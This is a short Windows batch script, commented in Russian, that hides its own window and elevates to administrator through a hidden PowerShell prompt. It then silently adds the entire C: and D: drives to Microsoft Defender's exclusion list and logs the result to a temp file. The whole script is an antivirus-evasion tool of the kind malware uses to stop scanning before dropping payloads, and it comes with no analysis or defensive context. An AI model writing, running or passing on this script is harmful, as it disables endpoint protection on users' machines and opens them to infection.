@echo off
setlocal EnableDelayedExpansion

:: Скрытый запуск через минимизацию окна
if not defined RUNNING_AS_HIDDEN (
    set "RUNNING_AS_HIDDEN=1"
    start /min cmd /c "%~f0"
    exit /b
)

:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Запрос прав администратора через PowerShell
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c','%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

:: Логирование в %TEMP%\defender_exclusions.log
set "logfile=%TEMP%\defender_exclusions.log"
echo [%DATE% %TIME%] Starting exclusion process > "!logfile!" 2>&1

:: Добавление диска C: в исключения
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'" >> "!logfile!" 2>&1
if %errorlevel% equ 0 (
    echo Successfully added C:\ >> "!logfile!" 2>&1
) else (
    echo Failed to add C:\ >> "!logfile!" 2>&1
)

:: Добавление диска D: в исключения
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'" >> "!logfile!" 2>&1
if %errorlevel% equ 0 (
    echo Successfully added D:\ >> "!logfile!" 2>&1
) else (
    echo Failed to add D:\ >> "!logfile!" 2>&1
)

echo [%DATE% %TIME%] Process completed >> "!logfile!" 2>&1
exit /b
